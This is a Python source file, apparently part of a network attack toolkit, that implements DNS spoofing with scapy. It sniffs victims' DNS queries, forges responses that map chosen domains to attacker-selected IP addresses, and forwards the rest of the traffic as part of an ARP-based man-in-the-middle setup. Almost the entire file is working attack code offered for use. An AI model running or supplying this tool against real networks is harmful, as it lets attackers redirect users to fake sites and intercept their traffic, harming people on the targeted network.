#!/usr/bin/env python3

"""dnsspoofing.py: Implementation of a DNS Spoofing attack."""

import time #Used to sleep
from scapy.all import * #Import scapy
import settings #import globals used across files
from constants import * #Import used constants
from networkreconnaissance import * #Import modules from own networkreconnaissance.py file
from safeoperations import * #Import thread safe operations

#Gets the MAC address of the 'spoofed' host. E.g., the gateway router (in case of DNS requests)
def getSpoofMAC(victimIP, attackTuplesDNS):
    #For each tuple
    for spoofTupleDNS in attackTuplesDNS:
        #Check if the victim IP matches
        if spoofTupleDNS['VIP'] == victimIP:
            #If the victim matches, return the spoofed MAC address
            return spoofTupleDNS['SMAC']
    return None

def getSpoofIP(ip, dnsQueryName, attackTuplesDNS):
    #For each tuple, check if it matches the sniffed packet
    for spoofTupleDNS in attackTuplesDNS:
        #Check if the victim matches
        if spoofTupleDNS['VIP'] == ip:
            #If the victim matches, check for each spoofIP present in the tuple, whether any of it's corresponding 'real' website match dnsQueryName
            for spoofIP in spoofTupleDNS['DomainTuples'].keys():
                for domainName in spoofTupleDNS['DomainTuples'][spoofIP]:
                    if domainName == dnsQueryName:
                        return spoofIP
    return None

def forwardPacket(iface, packet, attackTuplesDNS, attackTuplesARP):
    #Assign the MAC address for the forwarded destination
    #In case there is no MAC address, we don't forward the packet
    dstMac = getSpoofMAC(packet[IP].src, attackTuplesDNS)
    if dstMac != '':
        packet[Ether].dst = dstMac

        #Decide source MAC address
        #If we don't perform a MitM attack with the victim and spoof host, sourceMac = victimMac
        #Else if we do, sourceMac = attackerMac
        victimIP = packet[IP].src
        spoofIP = ''
        for arpTuple in attackTuplesARP:
        	if arpTuple['VIP'] == victimIP:
        		spoofIP = arpTuple['SIP']
        if spoofIP != '':
	        for arpTuple in attackTuplesARP:
	        	#Check if MitM attack is present:
	        	#If so, set the sourceMac to the attacker's MAC
	        	if arpTuple['VIP'] == spoofIP and arpTuple['SIP'] == victimIP:
	        		packet[Ether].src = getMAC(iface)
	        		sendp(packet, verbose = 0, iface=iface)
	        		return

        #No MitM attack, so sourceMac = victimMac (i.e., don't change it)
        sendp(packet, verbose = 0, iface=iface)
        return

#This function is called when a packet is found by sniffing.
#Checks the type of packet and determines, based on the content, whether to forward or send a spoofed response
def sniffedPacket(iface, attackTuplesDNS, attackTuplesARP):
    def checkPacketDNS(packet):
        def sniffPacketDNS():
            #Format : 
            #{'VIP : victimIP (from ARP tuples), 'SMAC' : spoofMAC (from ARP tuples), 
            #'DomainTuples' : {IPToSpoofTo1 : [domain1, domain2], IPToSpoofTo2 : [domain3, domain4], ...}}
            #Check whether the packet should actually be DNS spoofed, based on tuples
            queryName = packet[DNS].qd.qname.decode('ascii')[:-1]
            spoofIP = getSpoofIP(packet[IP].src, queryName, attackTuplesDNS)
            if (spoofIP != None):
                #Safely print
                sprint(settings.printMutex, '[!] Sniffed a DNS Request querying ' + str(queryName) + ' from ' + str(packet[IP].src) + '.')

                #Create the spoof packet
                spoofPacket = Ether(dst=packet[Ether].src, src=packet[Ether].dst)/IP(dst=packet[IP].src, src=packet[IP].dst)/\
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                DNS(id=packet[DNS].id, qr=1, rd=packet[DNS].rd, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spoofIP, ttl=64))

                #Send the spoof packet & indicate sent
                sendp(spoofPacket, verbose = 0, iface=iface)

                sprint(settings.printMutex, '[!] Sent a DNS Response: ' + str(queryName) + ' is at ' + str(spoofPacket[DNS].an.rdata.decode('ascii')) + '.\n')
            else:
                forwardPacket(iface, packet, attackTuplesDNS, attackTuplesARP)
            return
        #Check whether the packet is targeted at the MAC address of our current interface
        if getMAC(iface) == packet[Ether].dst:
            #Check whether it contains a DNS packet
            if DNS in packet:
                return sniffPacketDNS()
            elif Ether in packet and IP in packet:
                forwardPacket(iface, packet, attackTuplesDNS, attackTuplesARP)
        else:
            #Do nothing, as the packet is not directed specifically towards us
            return
    return checkPacketDNS

def executeSpoofingDNS(iface, attackTuplesDNS, attackTuplesARP):
    sniff(iface=iface, store=0, prn=sniffedPacket(iface, attackTuplesDNS, attackTuplesARP))